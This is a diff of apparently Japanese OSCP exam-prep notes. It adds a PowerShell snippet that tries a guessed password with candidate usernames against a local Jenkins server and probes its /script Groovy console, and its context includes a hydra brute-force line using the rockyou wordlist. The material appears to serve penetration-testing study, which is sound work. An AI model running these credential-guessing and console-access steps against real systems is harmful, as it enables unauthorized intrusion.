@@ -274,6 +274,19 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt \
 
 - OSCP試験第一回は、以下のようなJNKINSのAD setで落ちた
 
+以下でアクセスできる？
+```powershelll
+# SqueakyRedDesk111 でまず試す
+# ユーザー名の候補: jenkins, administrator, admin
+
+$cred = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("jenkins:SqueakyRedDesk111"))
+$headers = @{ Authorization = "Basic $cred" }
+Invoke-WebRequest -Uri http://127.0.0.1:8080 -Headers $headers -UseBasicParsing
+
+# /script (Groovyコンソール) に直接アクセス
+Invoke-WebRequest -Uri http://127.0.0.1:8080/script -Headers $headers -UseBasicParsing
+```
+
 ## WinPEAS実行結果抽出
 
 ```powershell
